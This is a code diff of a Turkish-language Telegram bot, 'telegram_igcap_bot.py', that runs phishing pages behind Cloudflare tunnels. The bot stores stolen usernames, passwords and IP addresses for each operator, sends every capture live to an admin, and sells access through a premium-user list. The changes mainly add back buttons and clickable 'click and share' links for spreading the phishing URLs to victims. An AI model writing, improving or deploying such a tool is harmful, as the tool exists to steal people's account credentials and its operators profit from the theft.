@@ -1,10 +1,3 @@
-# telegram_igcap_bot.py - TERMUX / Railway %100 ÇALIŞAN VERSİYON
-"""
-Güncellenmiş özellikler:
-- Kendi capture'leri resetleme (her kullanıcı için)
-- Admin için: kendi reset + tüm reset + tüm capture'leri görüntüleme
-"""
-
 import asyncio
 import json
 import os
@@ -306,7 +299,6 @@ def save_capture(ip, username, password, port):
         with open(filename, 'w') as f:
             json.dump(data, f, indent=2)
         print(f"💾 Capture kaydedildi: {username} → {user_id}")
-        # Admin'e canlı bildirim
         asyncio.create_task(notify_admin(ip, username, password, user_id))
     except Exception as e:
         print(f"❌ Save error: {e}")
@@ -429,7 +421,15 @@ def start_cloudflare_tunnel(port):
         print(f"❌ Cloudflared error: {e}")
         return None, None
 
-# ═══════════════════════════════════════════════════════════════ TELEGRAM KOMUTLARI
+# ═══════════════════════════════════════════════════════════════ YARDIMCI FONKSİYON
+async def edit_with_back(query, text, kb=None, parse_mode='Markdown'):
+    back_kb = [[InlineKeyboardButton("🔙 Geri", callback_data="back_to_start")]]
+    if kb:
+        back_kb = kb + back_kb
+    reply_markup = InlineKeyboardMarkup(back_kb)
+    await query.edit_message_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
+
+# ═══════════════════════════════════════════════════════════════ KOMUTLAR
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
 
@@ -466,6 +466,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = str(query.from_user.id)
 
+    if query.data == "back_to_start":
+        await start_cmd(update, context)
+        return
+
     if query.data == "manage" and user_id == str(ADMIN_ID):
         users_list = []
         for u in premium_users:
@@ -476,17 +480,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 display = f"`@{u}` (username)"
             users_list.append(f"• {display}")
         users_list = "\n".join(users_list) if users_list else "• Yok"
-        
-        await query.edit_message_text(
-            f"📋 *Premium Users:*\n{users_list}\n\n"
-            "*Kullan:* `/add_user 123456` veya `/add_user @username`",
-            parse_mode='Markdown'
-        )
+        text = f"📋 *Premium Users:*\n{users_list}\n\n*Kullan:* `/add_user 123456` veya `/add_user @username`"
+        await edit_with_back(query, text)
 
     elif query.data == "my_captures":
         filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
         if not os.path.exists(filename):
-            await query.edit_message_text("📭 Henüz capture'n yok.")
+            await edit_with_back(query, "📭 Henüz capture'n yok.")
             return
 
         try:
@@ -504,17 +504,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             f"🌐 `{c['ip']}`\n"
                             f"🕐 `{c['time'][:19].replace('T', ' ')}`\n\n"
                         )
-            await query.edit_message_text(text, parse_mode='Markdown')
+            await edit_with_back(query, text)
         except Exception as e:
-            await query.edit_message_text(f"❌ Dosya okuma hatası: {str(e)}")
+            await edit_with_back(query, f"❌ Dosya okuma hatası: {str(e)}")
 
     elif query.data == "reset_my":
         filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
         if os.path.exists(filename):
             os.remove(filename)
-            await query.edit_message_text("🗑️ **Kendi capture'lerin sıfırlandı!**")
+            text = "🗑️ **Kendi capture'lerin sıfırlandı!**"
         else:
-            await query.edit_message_text("📭 Zaten capture'n yok.")
+            text = "📭 Zaten capture'n yok."
+        await edit_with_back(query, text)
 
     elif query.data == "reset_all" and user_id == str(ADMIN_ID):
         count = 0
@@ -522,7 +523,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if file.startswith("captures_") and file.endswith(".json"):
                 os.remove(os.path.join(CAPTURES_DIR, file))
                 count += 1
-        await query.edit_message_text(f"🗑️ **Tüm capture'ler sıfırlandı!** ({count} kullanıcı dosyası silindi)")
+        text = f"🗑️ **Tüm capture'ler sıfırlandı!** ({count} kullanıcı dosyası silindi)"
+        await edit_with_back(query, text)
 
     elif query.data == "all_captures" and user_id == str(ADMIN_ID):
         text = "🌐 **Tüm Kullanıcıların Capture'leri:**\n\n"
@@ -547,7 +549,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     pass
         if not found:
             text += "📭 Henüz hiç capture yok."
-        await query.edit_message_text(text, parse_mode='Markdown')
+        await edit_with_back(query, text)
 
     elif query.data == "tunnel":
         await create_tunnel(query, user_id)
@@ -561,12 +563,8 @@ async def create_tunnel(query, user_id):
         remain = int(tunnel['end_time'] - time.time())
         if remain > 0:
             kb = [[InlineKeyboardButton("❌ Kapat", callback_data=f"kill_{user_id}")]]
-            await query.edit_message_text(
-                f"⏳ *Aktif tunnel:* `{tunnel['url']}`\n"
-                f"⏰ *Kalan:* `{remain//60}m {remain%60:02d}s`",
-                reply_markup=InlineKeyboardMarkup(kb),
-                parse_mode='Markdown'
-            )
+            text = f"⏳ *Aktif tunnel:* [Tıkla ve aç]({tunnel['url']})\n⏰ *Kalan:* `{remain//60}m {remain%60:02d}s`"
+            await edit_with_back(query, text, kb)
             return
 
     await query.edit_message_text("🔄 *Phishing + tunnel hazırlanıyor...*")
@@ -588,15 +586,14 @@ async def create_tunnel(query, user_id):
         }
 
         kb = [[InlineKeyboardButton("🔒 Kapat", callback_data=f"kill_{user_id}")]]
-        await query.edit_message_text(
+        text = (
             f"✅ **TUNNEL HAZIR!**\n\n"
-            f"🔗 `{url}`\n"
+            f"🔗 [Tıkla ve paylaş!]({url})\n"
             f"⏰ **10 dakika** aktif\n"
             f"📱 **Paylaşın!**\n\n"
-            f"*Live capture sana ve admine!* 🎣",
-            reply_markup=InlineKeyboardMarkup(kb),
-            parse_mode='Markdown'
+            f"*Live capture sana ve admine!* 🎣"
         )
+        await edit_with_back(query, text, kb)
 
         if user_id != str(ADMIN_ID):
             try:
@@ -604,13 +601,13 @@ async def create_tunnel(query, user_id):
                     ADMIN_ID,
                     f"🆕 **Yeni tunnel!**\n"
                     f"👤 `{query.from_user.first_name}` (`{user_id}`)\n"
-                    f"🔗 `{url}`",
+                    f"🔗 [Tıkla]({url})",
                     parse_mode='Markdown'
                 )
             except:
                 pass
     else:
-        await query.edit_message_text("❌ **HATA! Cloudflared çalışmıyor**")
+        await edit_with_back(query, "❌ **HATA! Cloudflared çalışmıyor**")
 
 async def kill_tunnel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -650,12 +647,10 @@ async def kill_tunnel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id in active_tunnels:
         del active_tunnels[user_id]
 
-    if closed:
-        await query.edit_message_text("🔒 **Tunnel başarıyla kapatıldı!**")
-    else:
-        await query.edit_message_text("⚠️ **Tunnel kapatma denendi ama tam kapanmayabilir.**\n`pkill -9 cloudflared` komutunu dene.")
+    text = "🔒 **Tunnel başarıyla kapatıldı!**" if closed else "⚠️ **Tunnel kapatma denendi ama tam kapanmayabilir.**\n`pkill -9 cloudflared` dene."
+    await edit_with_back(query, text)
 
-# Komutlar
+# ═══════════════════════════════════════════════════════════════ KOMUTLAR
 async def cmd_add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) != str(ADMIN_ID): return
     if not context.args:
@@ -686,29 +681,33 @@ async def cmd_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     arg = context.args[0].strip()
     if arg.startswith('@'):
-        uid_to_remove = arg[1:]
-        display = f"@{uid_to_remove}"
+        username = arg[1:]
+        uid_to_remove = username
+        display = f"@{username}"
     else:
         try:
             uid_to_remove = int(arg)
             display = str(uid_to_remove)
-        except:
+        except ValueError:
             await update.message.reply_text("❌ Geçersiz!")
             return
 
     removed = premium_users.discard(str(uid_to_remove))
     save_users()
+
     if removed:
-        await update.message.reply_text(f"✅ **{display}** kaldırıldı!")
+        await update.message.reply_text(f"✅ **{display}** premium'dan kaldırıldı!")
     else:
         await update.message.reply_text(f"ℹ️ **{display}** zaten premium değil.")
 
 async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) != str(ADMIN_ID): return
+    active_count = len(active_tunnels)
+    users_count = len(premium_users)
     await update.message.reply_text(
         f"📊 **Status:**\n"
-        f"• Aktif tunnel: **{len(active_tunnels)}**\n"
-        f"• Premium user: **{len(premium_users)}**"
+        f"• Aktif tunnel: **{active_count}**\n"
+        f"• Premium user: **{users_count}**"
     )
 
 # ═══════════════════════════════════════════════════════════════ MAIN
